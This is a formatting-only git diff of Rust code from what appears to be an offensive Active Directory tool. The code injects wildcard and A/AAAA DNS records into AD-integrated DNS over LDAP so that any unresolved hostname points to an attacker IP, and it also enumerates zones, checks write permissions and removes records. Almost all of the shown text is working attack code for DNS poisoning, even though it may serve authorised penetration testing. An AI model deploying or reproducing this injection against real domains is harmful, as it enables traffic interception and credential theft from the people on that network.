@@ -151,22 +151,24 @@ pub async fn inject_wildcard(
 ) -> Result<AdidnsInjectionResult> {
     info!(
         "{}",
-        "═══ ADIDNS Wildcard Record Injection ═══"
-            .bold()
-            .yellow()
+        "═══ ADIDNS Wildcard Record Injection ═══".bold().yellow()
     );
 
     let zone_encoded = encode_zone_name(domain);
     let domain_dn = domain_to_dn(domain);
 
     // Wildcard record DN
-    let record_dn = format!(
-        "DC=*,DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}"
-    );
+    let record_dn = format!("DC=*,DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}");
     info!("  Target record: {record_dn}");
 
     // Check if wildcard already exists using a search with the record_dn as base
-    let existing = ldap.custom_search_with_base(&record_dn, "(objectClass=dnsNode)", &["dnsRecord", "dNSTombstoned"]).await;
+    let existing = ldap
+        .custom_search_with_base(
+            &record_dn,
+            "(objectClass=dnsNode)",
+            &["dnsRecord", "dNSTombstoned"],
+        )
+        .await;
     match existing {
         Ok(entries) if !entries.is_empty() => {
             info!("  Wildcard record already exists, skipping creation");
@@ -186,12 +188,16 @@ pub async fn inject_wildcard(
     );
 
     // Create the DNS node via LDAP add
-    ldap.add_entry(&record_dn, &[
-        ("objectClass", &[b"top", b"dnsNode"]),
-        ("dnsRecord", &[&dns_record]),
-        ("dNSTombstoned", &[b"FALSE"]),
-        ("name", &[b"*"]),
-    ]).await?;
+    ldap.add_entry(
+        &record_dn,
+        &[
+            ("objectClass", &[b"top", b"dnsNode"]),
+            ("dnsRecord", &[&dns_record]),
+            ("dNSTombstoned", &[b"FALSE"]),
+            ("name", &[b"*"]),
+        ],
+    )
+    .await?;
 
     info!("  {} Wildcard record injected successfully", "✓".green());
     info!("  {} Any unresolved hostname → {attacker_ip}", "→".cyan());
@@ -233,21 +239,27 @@ pub async fn inject_a_record(
     let zone_encoded = encode_zone_name(domain);
     let domain_dn = domain_to_dn(domain);
 
-    let record_dn = format!(
-        "DC={hostname},DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}"
-    );
+    let record_dn =
+        format!("DC={hostname},DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}");
     info!("  Target record: {record_dn}");
 
     let dns_record = build_dns_a_record(target_ip, ttl)?;
 
-    info!("  {} Creating A record {hostname} → {target_ip} ...", "→".cyan());
+    info!(
+        "  {} Creating A record {hostname} → {target_ip} ...",
+        "→".cyan()
+    );
 
-    ldap.add_entry(&record_dn, &[
-        ("objectClass", &[b"top", b"dnsNode"]),
-        ("dnsRecord", &[&dns_record]),
-        ("dNSTombstoned", &[b"FALSE"]),
-        ("name", &[hostname.as_bytes()]),
-    ]).await?;
+    ldap.add_entry(
+        &record_dn,
+        &[
+            ("objectClass", &[b"top", b"dnsNode"]),
+            ("dnsRecord", &[&dns_record]),
+            ("dNSTombstoned", &[b"FALSE"]),
+            ("name", &[hostname.as_bytes()]),
+        ],
+    )
+    .await?;
 
     info!("  {} A record injected successfully", "✓".green());
 
@@ -269,18 +281,21 @@ pub async fn inject_aaaa_record(
     let zone_encoded = encode_zone_name(domain);
     let domain_dn = domain_to_dn(domain);
 
-    let record_dn = format!(
-        "DC={hostname},DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}"
-    );
+    let record_dn =
+        format!("DC={hostname},DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}");
 
     let dns_record = build_dns_aaaa_record(target_ip, ttl)?;
 
-    ldap.add_entry(&record_dn, &[
-        ("objectClass", &[b"top", b"dnsNode"]),
-        ("dnsRecord", &[&dns_record]),
-        ("dNSTombstoned", &[b"FALSE"]),
-        ("name", &[hostname.as_bytes()]),
-    ]).await?;
+    ldap.add_entry(
+        &record_dn,
+        &[
+            ("objectClass", &[b"top", b"dnsNode"]),
+            ("dnsRecord", &[&dns_record]),
+            ("dNSTombstoned", &[b"FALSE"]),
+            ("name", &[hostname.as_bytes()]),
+        ],
+    )
+    .await?;
 
     Ok(AdidnsInjectionResult {
         record_dn,
@@ -290,10 +305,7 @@ pub async fn inject_aaaa_record(
 }
 
 /// Remove a DNS record from AD-Integrated DNS.
-pub async fn remove_record(
-    ldap: &mut LdapSession,
-    record_dn: &str,
-) -> Result<()> {
+pub async fn remove_record(ldap: &mut LdapSession, record_dn: &str) -> Result<()> {
     info!("  {} Removing DNS record: {record_dn}", "→".cyan());
     ldap.delete_entry(&record_dn).await?;
     info!("  {} DNS record removed", "✓".green());
@@ -303,24 +315,21 @@ pub async fn remove_record(
 /// Enumerate all DNS records in the DomainDnsZones partition.
 ///
 /// Returns a list of all DNS node entries with their record data.
-pub async fn enumerate_zone(
-    ldap: &mut LdapSession,
-    domain: &str,
-) -> Result<AdidnsEnumResult> {
+pub async fn enumerate_zone(ldap: &mut LdapSession, domain: &str) -> Result<AdidnsEnumResult> {
     let zone_encoded = encode_zone_name(domain);
     let domain_dn = domain_to_dn(domain);
 
-    let base_dn = format!(
-        "DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}"
-    );
+    let base_dn = format!("DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}");
 
     info!("  {} Enumerating DNS zone: {base_dn}", "→".cyan());
 
-    let entries = ldap.custom_search_with_base(
-        &base_dn,
-        "(objectClass=dnsNode)",
-        &["name", "dnsRecord", "dNSTombstoned"],
-    ).await?;
+    let entries = ldap
+        .custom_search_with_base(
+            &base_dn,
+            "(objectClass=dnsNode)",
+            &["name", "dnsRecord", "dNSTombstoned"],
+        )
+        .await?;
 
     let records: Vec<AdidnsRecord> = entries
         .into_iter()
@@ -379,29 +388,32 @@ pub fn print_enum_summary(result: &AdidnsEnumResult) {
 }
 
 /// Check if the authenticated user can create DNS records (default: true).
-pub async fn check_permissions(
-    ldap: &mut LdapSession,
-    domain: &str,
-) -> Result<bool> {
+pub async fn check_permissions(ldap: &mut LdapSession, domain: &str) -> Result<bool> {
     let zone_encoded = encode_zone_name(domain);
     let domain_dn = domain_to_dn(domain);
 
-    let container_dn = format!(
-        "DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}"
-    );
+    let container_dn = format!("DC={zone_encoded},CN=MicrosoftDNS,DC=DomainDnsZones,{domain_dn}");
 
     // Try to search the container — if it exists, we can likely write
-    match ldap.custom_search_with_base(&container_dn, "(objectClass=dnsZone)", &["name"]).await {
+    match ldap
+        .custom_search_with_base(&container_dn, "(objectClass=dnsZone)", &["name"])
+        .await
+    {
         Ok(entries) if !entries.is_empty() => {
-            info!("  {} DNS zone container exists, write likely permitted", "✓".green());
+            info!(
+                "  {} DNS zone container exists, write likely permitted",
+                "✓".green()
+            );
             Ok(true)
         }
         _ => {
             // Try ForestDnsZones as fallback
-            let forest_base = format!(
-                "DC={zone_encoded},CN=MicrosoftDNS,CN=ForestDnsZones,{domain_dn}"
-            );
-            match ldap.custom_search_with_base(&forest_base, "(objectClass=dnsZone)", &["name"]).await {
+            let forest_base =
+                format!("DC={zone_encoded},CN=MicrosoftDNS,CN=ForestDnsZones,{domain_dn}");
+            match ldap
+                .custom_search_with_base(&forest_base, "(objectClass=dnsZone)", &["name"])
+                .await
+            {
                 Ok(entries) if !entries.is_empty() => {
                     info!("  {} Forest DNS zone container exists", "✓".green());
                     Ok(true)
@@ -442,7 +454,10 @@ mod tests {
     #[test]
     fn test_domain_to_dn() {
         assert_eq!(domain_to_dn("corp.local"), "DC=corp,DC=local");
-        assert_eq!(domain_to_dn("test.ad.example.com"), "DC=test,DC=ad,DC=example,DC=com");
+        assert_eq!(
+            domain_to_dn("test.ad.example.com"),
+            "DC=test,DC=ad,DC=example,DC=com"
+        );
     }
 
     #[test]
@@ -454,7 +469,8 @@ mod tests {
     #[test]
     fn test_adidns_injection_result() {
         let result = AdidnsInjectionResult {
-            record_dn: "DC=*,DC=corp\\2Clocal,CN=MicrosoftDNS,DC=DomainDnsZones,DC=corp,DC=local".to_string(),
+            record_dn: "DC=*,DC=corp\\2Clocal,CN=MicrosoftDNS,DC=DomainDnsZones,DC=corp,DC=local"
+                .to_string(),
             target_ip: "192.168.1.100".to_string(),
             verified: true,
         };
